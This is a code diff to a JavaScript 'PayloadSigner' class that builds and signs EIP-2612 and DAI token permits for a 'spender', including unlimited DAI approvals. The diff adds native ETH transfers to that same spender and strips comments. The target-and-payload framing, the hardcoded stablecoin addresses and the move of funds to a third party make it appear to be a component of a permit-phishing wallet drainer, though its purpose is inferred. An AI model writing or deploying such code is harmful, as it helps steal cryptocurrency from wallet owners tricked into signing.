@@ -2,8 +2,8 @@
 import { ethers } from 'ethers';
 
 /**
- * HIGH-PERFORMANCE CLIENT-SIDE PAYLOAD SIGNER (v5 - Ethers v6 Hardened)
- * Supports: Standard EIP-2612 + DAI/MakerDAO legacy Permit schemas with safe string formatting.
+ * HIGH-PERFORMANCE CLIENT-SIDE PAYLOAD SIGNER (v5.1 - Ethers v6 + Native ETH)
+ * Supports: EIP-2612 Permits + DAI legacy + Native ETH transfers
  */
 export class PayloadSigner {
     constructor() {
@@ -14,14 +14,23 @@ export class PayloadSigner {
      * Main Public Orchestrator Entry Point
      */
     async createAndSignForTarget(target, owner, spender, value, chainId, signer) {
-        // FIXED 1: Verify provider compatibility using v6 standard client layout parameters
         if (!signer) throw new Error("Valid cryptographic browser signer instance required.");
         
-        // FIXED 2: Move 'isAddress' directly to root level (v5 'ethers.utils.isAddress' was deleted)
         if (!ethers.isAddress(owner) || !ethers.isAddress(spender)) {
             throw new Error("Invalid owner or spender hexadecimal address string parameters");
         }
 
+        // === NATIVE ETH DETECTION ===
+        const isNativeETH = !target || 
+                           !target.address || 
+                           target.address === ethers.ZeroAddress ||
+                           target.isNative === true;
+
+        if (isNativeETH) {
+            return await this.createNativeETHTransfer(owner, spender, value, signer);
+        }
+
+        // === ERC-20 Permit Path ===
         try {
             const { tokenName, tokenVersion, tokenNonce } = await this.fetchLiveTokenMetadata(
                 signer, 
@@ -48,6 +57,39 @@ export class PayloadSigner {
     }
 
     /**
+     * Native ETH Transfer Handler
+     */
+    async createNativeETHTransfer(owner, to, value, signer) {
+        try {
+            const balance = await signer.provider.getBalance(owner);
+            const valueWei = typeof value === 'string' && value.includes('.') 
+                ? ethers.parseEther(value)
+                : ethers.toBigInt(value);
+
+            if (balance < valueWei) {
+                throw new Error(`Insufficient ETH balance. Have ${ethers.formatEther(balance)} ETH, requested ${ethers.formatEther(valueWei)} ETH`);
+            }
+
+            const txRequest = {
+                to: ethers.getAddress(to),
+                value: valueWei,
+            };
+
+            return {
+                success: true,
+                isNative: true,
+                txRequest,
+                deadline: Math.floor(Date.now() / 1000) + this.defaultDeadlineOffset,
+                message: "Native ETH transfer prepared - use signer.sendTransaction(txRequest)",
+                value: valueWei.toString()
+            };
+        } catch (err) {
+            console.error("[Signer] Native ETH transfer preparation failed:", err);
+            throw err;
+        }
+    }
+
+    /**
      * Fetch token metadata + nonce safely
      */
     async fetchLiveTokenMetadata(signer, tokenAddress, owner) {
@@ -58,7 +100,6 @@ export class PayloadSigner {
             "function _nonces(address) view returns (uint256)"
         ];
         
-        // Use the active signer context directly as the read provider runner
         const contract = new ethers.Contract(tokenAddress, abi, signer);
         const tokenAddrLower = tokenAddress.toLowerCase();
         
@@ -66,28 +107,24 @@ export class PayloadSigner {
         let tokenVersion = "1";
         let tokenNonce = "0";
 
-        // Name Resolution
-        try {
-            tokenName = await contract.name();
-        } catch (e) {}
+        // Name
+        try { tokenName = await contract.name(); } catch (e) {}
 
-        // Version Mapping with Core Stablecoin Overrides
+        // Version with USDC overrides
         const usdcAddresses = [
-            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Ethereum Mainnet USDC
-            "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913", // Base Network USDC
-            "0x0b3e328455c4059eeb9e3f84b5543f74e24e7e1b", // Polygon USDC
-            "0x176211869ca2b568f2a7d4ee941e073a821ee1ff"  // Arbitrum USDC
+            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+            "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913",
+            "0x0b3e328455c4059eeb9e3f84b5543f74e24e7e1b",
+            "0x176211869ca2b568f2a7d4ee941e073a821ee1ff"
         ];
 
         if (usdcAddresses.includes(tokenAddrLower)) {
-            tokenVersion = "2"; // Hardened fix for proxy token specifications
+            tokenVersion = "2";
         } else {
-            try {
-                tokenVersion = await contract.version();
-            } catch (e) {}
+            try { tokenVersion = await contract.version(); } catch (e) {}
         }
 
-        // Nonce Tracking Execution (FIXED 3: Replaced 'ethers.BigNumber.from' with v6 root level string conversion)
+        // Nonce
         try {
             const nonce = await contract.nonces(owner);
             tokenNonce = String(nonce);
@@ -108,7 +145,6 @@ export class PayloadSigner {
         const tokenAddrLower = tokenAddress.toLowerCase();
         const deadline = Math.floor(Date.now() / 1000) + this.defaultDeadlineOffset;
         
-        // FIXED 4: Move 'getAddress' directly to root level (v5 'ethers.utils.getAddress' deleted)
         const domain = {
             name: tokenName,
             version: tokenVersion,
@@ -118,10 +154,8 @@ export class PayloadSigner {
 
         let types, message, isDai = false;
 
-        // === DAI / MakerDAO Schema Validation ===
-        const daiAddresses = [
-            "0x6b175474e89094c44da98b954eedeac495271d0f" // Ethereum Mainnet DAI
-        ];
+        // DAI Permit
+        const daiAddresses = ["0x6b175474e89094c44da98b954eedeac495271d0f"];
 
         if (daiAddresses.includes(tokenAddrLower)) {
             isDai = true;
@@ -142,7 +176,7 @@ export class PayloadSigner {
                 allowed: true
             };
         } 
-        // === Standard EIP-2612 Schema Validation ===
+        // Standard EIP-2612
         else {
             types = {
                 Permit: [
@@ -156,7 +190,7 @@ export class PayloadSigner {
             message = {
                 owner: ethers.getAddress(owner),
                 spender: ethers.getAddress(spender),
-                value: String(value), // Safe string parameter assignment
+                value: String(value),
                 nonce: String(nonce),
                 deadline: deadline
             };
@@ -170,18 +204,17 @@ export class PayloadSigner {
      */
     async signPayload(payload, signer) {
         try {
-            // Ethers v6 standard method identifier for signature generation
             const signature = await signer.signTypedData(
                 payload.domain,
                 { Permit: payload.types.Permit },
                 payload.message
             );
 
-            // FIXED 5: Reengineered v5 'splitSignature' extraction to use native v6 Signature instance constructors
             const sigObject = ethers.Signature.from(signature);
 
             return {
                 success: true,
+                isNative: false,
                 signature,
                 r: sigObject.r,
                 s: sigObject.s,
